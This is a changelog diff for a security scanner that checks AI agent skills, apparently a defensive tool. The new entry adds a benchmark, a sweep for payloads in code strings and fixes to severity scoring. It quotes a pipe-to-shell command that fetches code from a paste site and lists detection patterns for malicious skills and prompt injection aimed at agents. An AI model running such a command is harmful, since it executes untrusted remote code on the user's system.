@@ -1,5 +1,34 @@
 # Changelog
 
+## 2.3.0 (2026-10-02)
+
+- **Shipped a benchmark.** `bench/run.py` measures detection and false alarms
+  against 35 labelled fixtures, with third-party corpora fetched at pinned
+  commits (`--corpus`). It exits 1 on a regression, so CI now fails when an
+  attack is missed or an ordinary skill is flagged. Current: **23/23 attacks
+  caught, 0/9 ordinary skills flagged, 0/34 real third-party skills flagged.**
+- **Fixed: a payload in a helper script only counted as a capability.** A skill
+  whose `.py` file ran `os.system("curl https://glot.io/... | bash")` came out
+  **Medium**, because "Shell Execution" is a capability that caps at 30 points
+  and nothing looked at what the string contained. New `payload` sweep reads
+  string literals in code files for paste-site hosts, remote pipe-to-shell,
+  decode-and-run and bare-IP URLs, and reports them as threats. That skill is
+  now Critical.
+- **Fixed: one High finding read as Medium.** Severity weights sat below their
+  own band floors (high was 30 points, the High band starts at 51), so a single
+  High threat landed in Medium. Weights are now 76/51/20/0, at the floor of each
+  band.
+- **Fixed: false positive on any object with a `role` key.** The "System Prompt
+  Construction" rule matched `{ role: 'column' }` in ordinary data objects
+  (tldraw calls), reporting High prompt injection. It now requires a real chat
+  role value (`system`, `user`, `assistant`, `tool`, `model`, `developer`) or a
+  `system`/`systemPrompt` key.
+- Added `docs/jev-spike.md`: measurements for the local classifier that was tried
+  on the context-dependent cases. Its verdict was "second opinion, raise-only".
+- Tests 81 (was 72). Benchmark fixtures and `bench/README.md` shipped with the
+  repo; **no third-party skill content is vendored** (`anthropics/skills` has no
+  licence, so corpora are fetched at run time).
+
 ## 2.2.1 (2026-10-02)
 
 - **Security fix: a warning could launder an attack.** 2.2.0 lowered any finding
